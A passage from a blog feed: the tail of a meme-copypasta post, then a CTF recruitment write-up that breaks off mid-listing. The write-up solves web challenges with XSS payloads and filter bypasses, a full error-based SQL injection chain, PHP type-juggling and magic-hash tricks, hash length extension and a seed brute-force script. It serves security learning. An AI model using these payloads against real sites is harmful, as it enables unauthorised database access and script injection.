id="阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开）-（尖叫）（扭曲）（阴暗的爬行）-（爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）"><a href="#阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开）-（尖叫）（扭曲）（阴暗的爬行）-（爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）" class="headerlink" title="阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开） （尖叫）（扭曲）（阴暗的爬行） （爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）"></a>阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开） （尖叫）（扭曲）（阴暗的爬行） （爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fuckworld">console.log(printf(echo 还会再见吗，燕子？(勉强的微笑)再见时你要幸福，好不好(关车门)燕子，你要开心，你要幸福，好不好？开心<br>啊，幸福。你的世界以后没有我了，没关系，你要自己幸福。(嘶吼)燕子！燕子！(哭喊)燕子！没有你我怎么活啊，燕子！(奔跑)(嘶吼)燕子！<br>燕子啊(仰头45度哭泣)(面目狰狞)(不甘的追赶)(咆哮)(无力地喘气)燕子！燕子，你带我走吧，燕子啊(停下)(蹲下)(跪下)(哭泣)(嚎啕大<br>哭););)<br><br></code></pre></td></tr></table></figure><blockquote><h1 id="请你不要生气-如果因为我的文字而骚扰到你-你可以来训我一顿-请不要因为我的这些行为而为我感到担心-我不重要的-我微不足道-我甚至可以和微生物相提并论-我的文字感动不了你似昆仑山上的冰山一般的心-没关系的-不回信息我也不会怎样的-我已经习惯了-已经习以为常了-我常常收不到你的信息-我甚至不知道是不是我手机的问题-就连一个表情包我也未曾收到-后来才发现这是你的问题-我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷-我都懂的-其实我也不是那么重要罢了"><a href="#请你不要生气-如果因为我的文字而骚扰到你-你可以来训我一顿-请不要因为我的这些行为而为我感到担心-我不重要的-我微不足道-我甚至可以和微生物相提并论-我的文字感动不了你似昆仑山上的冰山一般的心-没关系的-不回信息我也不会怎样的-我已经习惯了-已经习以为常了-我常常收不到你的信息-我甚至不知道是不是我手机的问题-就连一个表情包我也未曾收到-后来才发现这是你的问题-我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷-我都懂的-其实我也不是那么重要罢了" class="headerlink" title="请你不要生气 如果因为我的文字而骚扰到你 你可以来训我一顿 请不要因为我的这些行为而为我感到担心 我不重要的 我微不足道 我甚至可以和微生物相提并论 我的文字感动不了你似昆仑山上的冰山一般的心 没关系的 不回信息我也不会怎样的 我已经习惯了 已经习以为常了 我常常收不到你的信息 我甚至不知道是不是我手机的问题 就连一个表情包我也未曾收到 后来才发现这是你的问题 我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷 我都懂的 其实我也不是那么重要罢了"></a>请你不要生气 如果因为我的文字而骚扰到你 你可以来训我一顿 请不要因为我的这些行为而为我感到担心 我不重要的 我微不足道 我甚至可以和微生物相提并论 我的文字感动不了你似昆仑山上的冰山一般的心 没关系的 不回信息我也不会怎样的 我已经习惯了 已经习以为常了 我常常收不到你的信息 我甚至不知道是不是我手机的问题 就连一个表情包我也未曾收到 后来才发现这是你的问题 我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷 我都懂的 其实我也不是那么重要罢了</h1></blockquote><p><a href><em>没错你是个明白人我明白你明白的意思我也是明白人明白人就应该明白我明白你明白的意思只要大家都明白明白人应明白我明白你明白的意思这样网络环境就是充满明白人明白其他明白人所明白的事</em></a></p><blockquote><p><strong><span style="color: red;">你</span><span style="color: orange;">以</span><span style="color: yellow;">为</span><span style="color: green;">我</span><span style="color: blue;">还</span><span style="color: indigo;">会</span><span style="color: violet;">在</span><span style="color: gold;">乎</span><span style="color: silver;">吗</span>?<span style="color: crimson;">我</span><span style="color: coral;">在</span><span style="color: khaki;">昆</span><span style="color: olive;">仑</span><span style="color: lime;">山</span><span style="color: aqua;">练</span><span style="color: teal;">了</span><span style="color: navy;">六</span><span style="color: lavender;">年</span><span style="color: plum;">的</span><span style="color: fuchsia;">剑</span>，<span style="color: purple;">我</span><span style="color: maroon;">的</span><span style="color: red;">心</span><span style="color: orange;">早</span><span style="color: yellow;">就</span><span style="color: green;">和</span><span style="color: blue;">昆</span><span style="color: indigo;">仑</span><span style="color: violet;">山</span><span style="color: gold;">的</span><span style="color: silver;">雪</span><span style="color: crimson;">一</span><span style="color: coral;">样</span><span style="color: khaki;">冷</span><span style="color: olive;">了</span>。<span style="color: lime;">我</span><span style="color: aqua;">在</span><span style="color: teal;">大</span><span style="color: navy;">润</span><span style="color: lavender;">发</span><span style="color: plum;">杀</span><span style="color: fuchsia;">了</span><span style="color: purple;">十</span><span style="color: maroon;">年</span><span style="color: red;">的</span><span style="color: orange;">鱼</span>，<span style="color: yellow;">我</span><span style="color: green;">以</span><span style="color: blue;">为</span><span style="color: indigo;">我</span><span style="color: violet;">的</span><span style="color: gold;">心</span><span style="color: silver;">早</span><span style="color: crimson;">已</span><span style="color: coral;">跟</span><span style="color: khaki;">我</span><span style="color: olive;">的</span><span style="color: lime;">刀</span><span style="color: aqua;">一</span><span style="color: teal;">样</span><span style="color: navy;">冷</span><span style="color: lavender;">了</span>，<span style="color: plum;">可</span><span style="color: fuchsia;">是</span><span style="color: purple;">当</span><span style="color: maroon;">我</span><span style="color: red;">点</span><span style="color: orange;">开</span><span style="color: yellow;">这</span><span style="color: green;">个</span><span style="color: blue;">课</span><span style="color: indigo;">表</span><span style="color: violet;">眼</span><span style="color: gold;">泪</span><span style="color: silver;">如</span><span style="color: crimson;">黄</span><span style="color: coral;">果</span><span style="color: khaki;">树</span><span style="color: olive;">瀑</span><span style="color: lime;">布</span><span style="color: aqua;">般</span><span style="color: teal;">飞</span><span style="color: navy;">流</span><span style="color: lavender;">直</span><span style="color: plum;">下</span>，<span style="color: fuchsia;">划</span><span style="color: purple;">过</span><span style="color: maroon;">我</span><span style="color: red;">的</span><span style="color: orange;">脸</span><span style="color: yellow;">庞</span>，<span style="color: green;">打</span><span style="color: blue;">湿</span><span style="color: indigo;">了</span><span style="color: violet;">我</span><span style="color: gold;">的</span><span style="color: silver;">人</span><span style="color: crimson;">字</span><span style="color: coral;">拖</span>，<span style="color: khaki;">脚</span><span style="color: olive;">趾</span><span style="color: lime;">都</span><span style="color: aqua;">变</span><span style="color: teal;">得</span><span style="color: navy;">酸</span><span style="color: lavender;">涩</span>，<span style="color: plum;">只</span><span style="color: fuchsia;">想</span><span style="color: purple;">说</span>，<span style="color: maroon;">能</span><span style="color: red;">不</span><span style="color: orange;">能</span>…<span style="color: yellow;">不</span><span style="color: green;">要</span>…</strong></p></blockquote><p><em><strong><span style="color:#ff0000">为</span><span style="color:#ff9900">什</span><span style="color:#ffcc00">么</span><span style="color:#66cc00">要</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">做</span><span style="color:#9900cc">选</span><span style="color:#ff0000">择</span><span style="color:#ff9900">，</span><span style="color:#ffcc00">为</span><span style="color:#66cc00">什</span><span style="color:#00ffcc">么</span><span style="color:#66ccff">！</span><span style="color:#9900cc">你</span><span style="color:#ff0000">不</span><span style="color:#ff9900">知</span><span style="color:#ffcc00">道</span><span style="color:#66cc00">我</span><span style="color:#00ffcc">有</span><span style="color:#66ccff">选</span><span style="color:#9900cc">择</span><span style="color:#ff0000">恐</span><span style="color:#ff9900">惧</span><span style="color:#ffcc00">症</span><span style="color:#66cc00">吗</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">不</span><span style="color:#ff0000">知</span><span style="color:#ff9900">道</span><span style="color:#ffcc00">让</span><span style="color:#66cc00">我</span><span style="color:#00ffcc">选</span><span style="color:#66ccff">会</span><span style="color:#9900cc">直</span><span style="color:#ff0000">接</span><span style="color:#ff9900">会</span><span style="color:#ffcc00">让</span><span style="color:#66cc00">我</span><span style="color:#00ffcc">辗</span><span style="color:#66ccff">转</span><span style="color:#9900cc">反</span><span style="color:#ff0000">侧</span><span style="color:#ff9900">参</span><span style="color:#ffcc00">差</span><span style="color:#66cc00">荇</span><span style="color:#00ffcc">菜</span><span style="color:#66ccff">彻</span><span style="color:#9900cc">夜</span><span style="color:#ff0000">难</span><span style="color:#ff9900">眠</span><span style="color:#ffcc00">吗</span><span style="color:#66cc00">，</span><span style="color:#00ffcc">你</span><span style="color:#66ccff">轻</span><span style="color:#9900cc">飘</span><span style="color:#ff0000">飘</span><span style="color:#ff9900">一</span><span style="color:#ffcc00">句</span><span style="color:#66cc00">让</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">选</span><span style="color:#9900cc">却</span><span style="color:#ff0000">让</span><span style="color:#ff9900">我</span><span style="color:#ffcc00">在</span><span style="color:#66cc00">午</span><span style="color:#00ffcc">夜</span><span style="color:#66ccff">梦</span><span style="color:#9900cc">回</span><span style="color:#ff0000">时</span><span style="color:#ff9900">惊</span><span style="color:#ffcc00">醒</span><span style="color:#66cc00">，</span><span style="color:#00ffcc">瞬</span><span style="color:#66ccff">间</span><span style="color:#9900cc">手</span><span style="color:#ff0000">脚</span><span style="color:#ff9900">冰</span><span style="color:#ffcc00">凉</span><span style="color:#66cc00">，</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">想</span><span style="color:#9900cc">要</span><span style="color:#ff0000">挣</span><span style="color:#ff9900">扎</span><span style="color:#ffcc00">却</span><span style="color:#66cc00">没</span><span style="color:#00ffcc">有</span><span style="color:#66ccff">力</span><span style="color:#9900cc">气</span><span style="color:#ff0000">，</span><span style="color:#ff9900">像</span><span style="color:#ffcc00">一</span><span style="color:#66cc00">只</span><span style="color:#00ffcc">缺</span><span style="color:#66ccff">氧</span><span style="color:#9900cc">的</span><span style="color:#ff0000">鱼</span><span style="color:#ff9900">。</span><span style="color:#ffcc00">你</span><span style="color:#66cc00">在</span><span style="color:#00ffcc">乎</span><span style="color:#66ccff">吗</span><span style="color:#9900cc">？</span><span style="color:#ff0000">你</span><span style="color:#ff9900">不</span><span style="color:#ffcc00">在</span><span style="color:#66cc00">乎</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">只</span><span style="color:#ff0000">在</span><span style="color:#ff9900">乎</span><span style="color:#ffcc00">你</span><span style="color:#66cc00">自</span><span style="color:#00ffcc">己</span><span style="color:#66ccff">，</span><span style="color:#9900cc">就</span><span style="color:#ff0000">像</span><span style="color:#ff9900">你</span><span style="color:#ffcc00">不</span><span style="color:#66cc00">在</span><span style="color:#00ffcc">乎</span><span style="color:#66ccff">鱼</span><span style="color:#9900cc">香</span><span style="color:#ff0000">肉</span><span style="color:#ff9900">丝</span><span style="color:#ffcc00">里</span><span style="color:#66cc00">没</span><span style="color:#00ffcc">有</span><span style="color:#66ccff">鱼</span><span style="color:#9900cc">，</span><span style="color:#ff0000">虎</span><span style="color:#ff9900">皮</span><span style="color:#ffcc00">辣</span><span style="color:#66cc00">子</span><span style="color:#00ffcc">里</span><span style="color:#66ccff">没</span><span style="color:#9900cc">有</span><span style="color:#ff0000">老</span><span style="color:#ff9900">虎</span><span style="color:#ffcc00">，</span><span style="color:#66cc00">你</span><span style="color:#00ffcc">也</span><span style="color:#66ccff">不</span><span style="color:#9900cc">在</span><span style="color:#ff0000">乎</span><span style="color:#ff9900">纠</span><span style="color:#ffcc00">结</span><span style="color:#66cc00">到</span><span style="color:#00ffcc">快</span><span style="color:#66ccff">要</span><span style="color:#9900cc">发</span><span style="color:#ff0000">疯</span><span style="color:#ff9900">的</span><span style="color:#ffcc00">我</span><span style="color:#66cc00">。</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">都</span><span style="color:#9900cc">这</span><span style="color:#ff0000">样</span><span style="color:#ff9900">了</span><span style="color:#ffcc00">，</span><span style="color:#66cc00">你</span><span style="color:#00ffcc">却</span><span style="color:#66ccff">还</span><span style="color:#9900cc">能</span><span style="color:#ff0000">若</span><span style="color:#ff9900">无</span><span style="color:#ffcc00">其</span><span style="color:#66cc00">事</span><span style="color:#00ffcc">的</span><span style="color:#66ccff">等</span><span style="color:#9900cc">我</span><span style="color:#ff0000">做</span><span style="color:#ff9900">出</span><span style="color:#ffcc00">决</span><span style="color:#66cc00">定</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">的</span><span style="color:#ff0000">理</span><span style="color:#ff9900">所</span><span style="color:#ffcc00">当</span><span style="color:#66cc00">然</span><span style="color:#00ffcc">像</span><span style="color:#66ccff">利</span><span style="color:#9900cc">剑</span><span style="color:#ff0000">一</span><span style="color:#ff9900">样</span><span style="color:#ffcc00">扎</span><span style="color:#66cc00">在</span><span style="color:#00ffcc">我</span><span style="color:#66ccff">脑</span><span style="color:#9900cc">壳</span><span style="color:#ff0000">上</span><span style="color:#ff9900">，</span><span style="color:#ffcc00">我</span><span style="color:#66cc00">的<span style="color:#ff0000">脑</span><span style="color:#ff9900">子</span><span style="color:#ffcc00">疼</span><span style="color:#66cc00">的</span><span style="color:#00ffcc">要</span><span style="color:#66ccff">裂</span><span style="color:#9900cc">开</span><span style="color:#ff0000">，</span><span style="color:#ff9900">而</span><span style="color:#ffcc00">你</span><span style="color:#66cc00">呢</span><span style="color:#00ffcc">，</span><span style="color:#66ccff">你</span><span style="color:#9900cc">依</span><span style="color:#ff0000">旧</span><span style="color:#ff9900">无</span><span style="color:#ffcc00">辜</span><span style="color:#66cc00">地</span><span style="color:#00ffcc">坐</span><span style="color:#66ccff">在</span><span style="color:#9900cc">那</span><span style="color:#ff0000">里</span><span style="color:#ff9900">看</span><span style="color:#ffcc00">我</span><span style="color:#66cc00">痛</span><span style="color:#00ffcc">苦</span><span style="color:#66ccff">不</span><span style="color:#9900cc">堪</span><span style="color:#ff0000">，</span><span style="color:#ff9900">你</span><span style="color:#ffcc00">好</span><span style="color:#66cc00">狠</span><span style="color:#00ffcc">啊</span><span style="color:#66ccff">！</span></span></strong></em></p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Viking 2023 Recruit WriteUps~~~</title>
    <link href="/posts/29460/"/>
    <url>/posts/29460/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="原神，启动！Ⅰ"><a href="#原神，启动！Ⅰ" class="headerlink" title="原神，启动！Ⅰ"></a>原神，启动！Ⅰ</h2><p>xss入门</p><p><code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{th1s&#x2F;sAb3g1nN1ng}</font></center></strong></em></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>屏蔽了一些东西</p><p><img src="/posts/29460/image-20231021234623039.png" alt="image-20231021234623039"></p><p>那就来点朴实无华的</p><p><img src="/posts/29460/image-20231021234732538.png" alt="image-20231021234732538"></p><p>flag在注释里，base64解密一下就好了</p><p><em><strong><center><font color="#81ecec" size="5">vkctf{C0ngratul4t10n!_Y0u_h4v3_f0und_th3_fl4g}</font></center></strong></em></p><h2 id="原神，启动！Ⅲ"><a href="#原神，启动！Ⅲ" class="headerlink" title="原神，启动！Ⅲ"></a>原神，启动！Ⅲ</h2><p>xss依旧</p><p>随便试下，发现是跳转到输入的地址，为<code>&lt;a&gt;</code>标签</p><p>使用<code>javascript:alert(1)</code>，添加，f12发现<code>script</code>变成了<code>scr_ipt</code>，有了过滤</p><p>用<code>&quot;</code>试试，发现被转义成了<code>&amp;quot;</code></p><p>这里用<code>&amp;#115</code>来代替<code>s</code></p><p><code>java&amp;#115cript:alert(1)</code></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{W3rrrnear2success}</font></center></strong></em></p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>sql入门</p><p>首先试试单引号</p><p>报错了<img src="/posts/29460/image-20231022003019324.png" alt="image-20231022003019324"></p><p>发现多了括号</p><p>试试万能密码<code>&#39;) or 1=1 #</code></p><p>登录成功</p><p><code>&#39;) order by 2 #</code></p><p>查出两列</p><p>因为没有回显点</p><p>所以尝试报错注入</p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select database())),1)) #</code></p><p><img src="/posts/29460/image-20231022004840826.png" alt="image-20231022004840826"></p><p>得到数据库名为<code>viking2023DB</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)) #</code></p><p><img src="/posts/29460/image-20231022004826969.png" alt="image-20231022004826969"></p><p>得到表名为<code>viking2023</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;viking2023&#39;)),1)) #</code></p><p><img src="/posts/29460/image-20231022005028106.png" alt="image-20231022005028106"></p><p>得到列名为<code>flag</code></p><p><code> &#39;) and (select updatexml(1,concat(&#39;~&#39;,(select flag from viking2023DB.viking2023)),1)) #</code></p><p><img src="/posts/29460/image-20231022005127837.png" alt="image-20231022005127837"></p><p>bingo!</p><p><em><strong><center><font color="#81ecec" size="5">vking{h2llo_welc0m2_u2stc}</font></center></strong></em></p><h2 id="robot有什么作用呢？"><a href="#robot有什么作用呢？" class="headerlink" title="robot有什么作用呢？"></a>robot有什么作用呢？</h2><p>根据题目提示，访问robots.txt</p><p><img src="/posts/29460/image-20231022005231643.png" alt="image-20231022005231643"></p><p>访问<code>/Y0u_need_t0_do_0ther_th1ng.php</code></p><p>发现是反序列化</p><p><img src="/posts/29460/image-20231022005351928.png" alt="image-20231022005351928"></p><h3 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h3><blockquote><p>需要绕过 <code>is_numeric($a) &amp;&amp; strlen($a)&lt;=6 &amp;&amp; $a!=0 &amp;&amp; $a**2 == 0</code></p><p>要求<code>$a</code>不能为0，但是又平方要为0，真是的</p><p>试了半天，不会，搜了一下</p><blockquote><p>发现：</p><p>php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。 也就是 0.00000…1(小数点后161个0)到0.00000…1(小数点后322个0)，我们可以用科学计数法来代替，即 <code>1e-162</code></p></blockquote><p>得到</p><p><em><strong>vkctf{1_th1nk_</strong></em></p></blockquote><h3 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h3><blockquote><p><code>$b</code>参数需要通过<code>POST</code>获得，<code>postman</code>启动！！</p><p>要求<code>$b</code>非数字，且大于<code>2023</code></p><blockquote><p><code>is_numeric()</code> 函数会判断如果是数字和数字字符串则返回 <code>TRUE</code>，否则返回 <code>FALSE</code>，且php中弱类型比较时，会使<code>(&#39;2024a&#39; == 2024)</code>为真</p></blockquote><p><em><strong>y0u_h4v3_kn0wn</strong></em></p></blockquote><h3 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h3><blockquote><p><code>$c</code>和<code>$d</code>依然需要<code>POST</code>请求</p><p>这里是一个MD5碰撞</p><p><code>==</code>弱类型比较</p><p>尝试可知<code>var_dump(&quot;0e123456&quot;==&quot;0e234567&quot;); //true</code></p><p>所以我们只需要让<code>sha1($c)</code>和<code>md5($d)</code>为<code>0e</code>开头，后面全为数字就行了</p><p>顺便把前面条件绕一下</p><p>好像爆破不出来，那上网拿一个吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-number">10932435112</span><br>d = QNKCDZO<br></code></pre></td></tr></table></figure><p><em><strong>_s0meth1ng_ab0ut_php</strong></em></p></blockquote><h3 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h3><blockquote><blockquote><p><code>strpos()</code>函数查找字符串在另一字符串中第一次出现的位置，如果没有找到该字符串，则返回 <code>false</code>。</p><p>可以用数组进行绕过。</p></blockquote><p><em><strong>_and_rob0ts.txt!}</strong></em></p></blockquote><p><em><strong><center><font color="#81ecec" size="5">vkctf{1_th1nk_y0u_h4v3_kn0wn_s0meth1ng_ab0ut_php_and_rob0ts.txt!}</font></center></strong></em></p><h2 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h2><p>根据提示访问<code>/help.txt</code></p><p><img src="/posts/29460/image-20231023001508423.png" alt="image-20231023001508423"></p><p>让我们访问文件</p><p>一通尝试，发现<code>/flag2.txt</code>可以</p><p><img src="/posts/29460/image-20231023001608912.png" alt="image-20231023001608912"></p><p>得到用户名和密码，且提示我们用<code>/dict.txt</code></p><p><img src="/posts/29460/image-20231023001657353.png" alt="image-20231023001657353"></p><p>仔细seesee，发现一个<code>/admin</code>，狠狠访问！</p><p><code>username = admin</code></p><p><code>password=YWRtaW4xMjM=</code></p><p>发现登陆失败，哦，忘记给密码解码了，一眼base64</p><p>解码得到<code>admin123</code></p><p><img src="/posts/29460/image-20231023002044581.png" alt="image-20231023002044581"></p><p><strong><del>启动成功！</del>登陆成功！</strong></p><p>接着<code>F12</code>就得到flag了</p><p><em><strong><center><font color="#81ecec" size="5">viking{hi0t3vJ9obLo8oz8EujZ}</font></center></strong></em></p><h2 id="Hash-attack"><a href="#Hash-attack" class="headerlink" title="Hash_attack"></a>Hash_attack</h2><p><img src="/posts/29460/image-20231024124812566.png" alt="image-20231024124812566"></p><p>哈希长度拓展攻击，原理不太懂</p><p>找个别人写好的来用用</p><p>这里用的是<code>HashPump</code>（貌似库没了</p><p><img src="/posts/29460/image-20231024131137953.png" alt="image-20231024131137953"></p><blockquote><p><code>Signature</code>是提示给的<code>md5($salt.&quot;vkpass&quot;)</code></p><p><code>Data</code>是<code>pass</code>（因为判断条件<code>$password!=&quot;pass&quot;</code></p><p><code>Key Length</code>则是<code>$salt</code>+<code>$username</code>的长度</p><p><code>Data to Add</code>就随意了</p></blockquote><p>得到一串<code>hash</code>和<code>payload</code></p><p>现在就很清晰了（应该吧</p><p><img src="/posts/29460/image-20231024131735567.png" alt="image-20231024131735567"></p><p>这里记得把<code>\x</code>替换成<code>%</code>，因为post上去会有<code>urldecode()</code>操作</p><p><img src="/posts/29460/image-20231024131755326.png" alt="image-20231024131755326"></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{1iU_2Hu_Xi_5Mi1}</font></center></strong></em></p><h2 id="剑来"><a href="#剑来" class="headerlink" title="剑来"></a>剑来</h2><p>访问题目，<code>F12</code>查看得知点击按钮跳转<code>flag.php</code></p><p><img src="/posts/29460/image-20231023193734369.png" alt="image-20231023193734369"></p><p>但是点了却不是<code>flag.php</code></p><p>可知是<code>302跳转</code></p><p>一般用<code>curl</code>的方式访问<code>flag.php</code></p><p>可惜</p><p><img src="/posts/29460/image-20231023193938566.png" alt="image-20231023193938566"></p><p>前面注意到<code>script</code>里会设置<code>cookie</code></p><p><img src="/posts/29460/image-20231023194015312.png" alt="image-20231023194015312"></p><p>根据题目猜测要把改成<code>admin=jianlai</code></p><p><img src="/posts/29460/image-20231023194114152.png" alt="image-20231023194114152"></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{ZHi_dao_chEngRen_c8Owu_Jianla1}</font></center></strong></em></p><h2 id="签收您的gift"><a href="#签收您的gift" class="headerlink" title="签收您的gift"></a>签收您的gift</h2><p>这真的是web吗？😖😖😖</p><p><img src="/posts/29460/image-20231024162718448.png" alt="image-20231024162718448"></p><p>可以发现二维码的数据被编码了，解码就是对应的二维码图片数据了</p><p>接着，写个小脚本，或者找个<strong>小网站</strong>（<a href="https://www.lddgo.net/convert/base64-to-image">在线Base64转图片 (lddgo.net)</a>），转换成图片就行了</p><p>扫码可得十个数字</p><p><img src="/posts/29460/image-20231024165708370.png" alt="image-20231024165708370"></p><p>分析下<code>generate_qr_code()</code>函数，这里截出了有用的部分</p><p><img src="/posts/29460/image-20231024163425533.png" alt="image-20231024163425533"></p><p><img src="/posts/29460/image-20231024163937057.png" alt="image-20231024163937057"></p><blockquote><p>从1-1000中随机选择数字作为种子seed</p><p>循环十次<code>getrandbits()</code>，往reveal中增加生成的字符</p><p>循环结束后，再获取一次<code>getrandbits()</code>，并把生成的数库塞到qrcode里</p></blockquote><p>这里需要知道，当种子固定，<code>getrandbits()</code>获得的随机数也相应固定，那我就跟你们爆了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>res = [<span class="hljs-number">6</span>, <span class="hljs-number">252</span>, <span class="hljs-number">12</span>, <span class="hljs-number">137</span>, <span class="hljs-number">124</span>, <span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">201</span>, <span class="hljs-number">187</span>, <span class="hljs-number">200</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    reveal = []<br>    random.seed(j)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        reveal.append(random.getrandbits(<span class="hljs-number">8</span>))<br>    target = random.getrandbits(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment"># print(target)</span><br>    <span class="hljs-keyword">if</span> reveal == res:<br>        <span class="hljs-comment"># print(j)</span><br>        <span class="hljs-built_in">print</span>(target)<br>        <span class="hljs-comment"># print(reveal)</span><br><br></code></pre></td></tr></table></figure><p><img src="/posts/29460/image-20231024164806099.png" alt="image-20231024164806099"></p><p><em><strong><center><font color="#81ecec" size="5">viking{m1sc_0r_w2b_0r_crypt0?}</font></center></strong></em></p><h2 id="unserialization"><a href="#unserialization" class="headerlink" title="unserialization"></a>unserialization</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 